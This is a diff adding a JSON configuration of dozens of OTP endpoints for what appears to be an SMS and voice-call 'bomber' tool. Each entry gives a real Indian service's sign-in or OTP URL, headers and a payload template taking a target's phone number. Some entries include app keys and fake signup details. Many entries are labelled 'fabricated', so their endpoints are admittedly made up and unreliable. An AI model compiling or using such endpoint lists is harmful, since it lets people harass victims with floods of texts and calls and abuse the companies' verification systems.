+      "name": "Paytm Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2325",
+      "name": "MakeMyTrip Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2326",
+      "name": "Goibibo Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.goibibo.com/user/voice-otp/generate/",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2324",
+      "name": "Zomato Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/o2_api_handler.php",
+      "phone_in": "body_form",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "payload_template": "phone={{phone}}&type=voice"
+    },
+    {
+      "id": "ep_2320",
+      "name": "Myntra Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2321",
+      "name": "Flipkart Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2322",
+      "name": "Amazon Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/signin",
+      "phone_in": "body_form",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "payload_template": "phone={{phone}}&action=voice_otp"
+    },
+    {
+      "id": "ep_2319",
+      "name": "Swiggy Call",
+      "type": "call",
+      "method": "POST",
+      "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2318",
+      "name": "1MG Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.1mg.com/auth_api/v6/create_token",
+      "phone_in": "body",
+      "phone_field": "number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "number": "{{phone}}",
+        "otp_on_call": true
+      }
+    },
+    {
+      "id": "ep_2404",
+      "name": "BookMyShow Voice v2 (Bomber.py)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://in.bookmyshow.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2153",
+      "name": "Hotstar Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.hotstar.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2155",
+      "name": "ZEE5 Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.zee5.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2156",
+      "name": "JioCinema Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.jiocinema.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2157",
+      "name": "JioSaavn Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.jiosaavn.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2154",
+      "name": "SonyLIV Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.sonyliv.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2152",
+      "name": "Netflix Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.netflix.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2148",
+      "name": "PhonePe Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://phonepe.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2149",
+      "name": "MobiKwik Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://mobikwik.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2150",
+      "name": "Dominos Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://dominos.in/api/v2/auth/send-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2158",
+      "name": "Airtel Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.airtel.in/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2146",
+      "name": "Zepto Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://zepto.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_0007",
+      "name": "Swiggy Voice OTP v2",
+      "type": "call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}",
+        "channel": "voice"
+      }
+    },
+    {
+      "id": "ep_0006",
+      "name": "Generic Voice OTP",
+      "type": "call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2141",
+      "name": "KreditBee SMS v1",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.kreditbee.com/otp/send",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2348",
+      "name": "Shiprocket OTP v3",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+      "phone_in": "body",
+      "phone_field": "mobileNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "authorization": "Bearer null"
+      },
+      "payload_template": {
+        "mobileNumber": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2206",
+      "name": "MyImagineStore",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
+      "phone_in": "body_form",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "payload_template": "mobile={{phone}}"
+    },
+    {
+      "id": "ep_2216",
+      "name": "Redcliffe Labs",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone_number": "{{phone}}",
+        "short": true,
+        "country_code": "+91",
+        "medium": ""
+      }
+    },
+    {
+      "id": "ep_2104",
+      "name": "Redcliffe v1",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone_number": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2592",
+      "name": "Cuemath Parents Signup",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.cuemath.com/api/v4/parents/",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "intl_mobile": {
+          "phone": "{{phone}}"
+        },
+        "phone": "{{phone}}",
+        "email": "tsunami@gmail.com",
+        "full_name": "Tsunami Bomber",
+        "timezone": "Asia/Calcutta",
+        "form_fields": "full_name,email,intl_mobile"
+      }
+    },
+    {
+      "id": "ep_2458",
+      "name": "Agrevolution DeHaat OTP",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+      "phone_in": "body",
+      "phone_field": "mobile_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile_number": "{{phone}}",
+        "client_id": "kisan-app"
+      }
+    },
+    {
+      "id": "ep_2306",
+      "name": "TradeX",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.tradexapp.co/v2/sendotp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}",
+        "source": "sms",
+        "country_code": "+91",
+        "version": 1099
+      }
+    },
+    {
+      "id": "ep_2305",
+      "name": "Nxtwave CCBP",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/user/login/phone_number/v1/",
+      "phone_in": "body",
+      "phone_field": "data",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "data": "{\"phone_number\":\"{{phone}}\",\"country_code\":\"+91\"}",
+        "clientKeyDetailsId": 1
+      }
+    },
+    {
+      "id": "ep_2186",
+      "name": "Spencer's",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://jiffy.spencers.in/user/auth/otp/send",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2263",
+      "name": "TyrePlex",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
+      "phone_in": "body_form",
+      "phone_field": "mobile_no",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "payload_template": "perform_action=sendOTP&mobile_no={{phone}}&action_type=order_login"
+    },
+    {
+      "id": "ep_2262",
+      "name": "MPaani",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "client-code": "vulpix"
+      },
+      "payload_template": {
+        "phone_number": "{{phone}}",
+        "role": "CUSTOMER"
+      }
+    },
+    {
+      "id": "ep_2260",
+      "name": "Woodenstreet popup",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
+      "phone_in": "body_form",
+      "phone_field": "telephone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "payload_template": "token=&firstname=User&telephone={{phone}}&pincode=110086&city=DELHI&state=DELHI&email=test%40gmail.com&password=%40Password1&pagesource=onload&redirect2=&login=2&userput_otp="
+    },
+    {
+      "id": "ep_2271",
+      "name": "Woodenstreet API",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.woodenstreet.com/api/v1/register",
+      "phone_in": "body",
+      "phone_field": "telephone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "firstname": "User",
+        "email": "test@gmail.com",
+        "telephone": "{{phone}}",
+        "password": "Passw0rd!x",
+        "isGuest": 0,
+        "pincode": "110001"
+      }
+    },
+    {
+      "id": "ep_2136",
+      "name": "EarlySalary SMS v1",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.earlysalary.com/v1/otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2340",
+      "name": "KPN Fresh v3",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797"
+      },
+      "payload_template": {
+        "phone_number": {
+          "number": "{{phone}}",
+          "country_code": "+91"
+        }
+      }
+    },
+    {
+      "id": "ep_2224",
+      "name": "KPN Fresh",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json; charset=UTF-8",
+        "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
+        "x-app-version": "3.0.3",
+        "x-user-journey-id": "7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec"
+      },
+      "payload_template": {
+        "phone_number": {
+          "country_code": "+91",
+          "number": "{{phone}}"
+        }
+      }
+    },
+    {
+      "id": "ep_2249",
+      "name": "iXigo",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
+      "phone_in": "body_form",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "apikey": "ixiweb*2$",
+        "clientid": "ixiweb"
+      },
+      "payload_template": "sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={{phone}}"
+    }
+  ]
+}
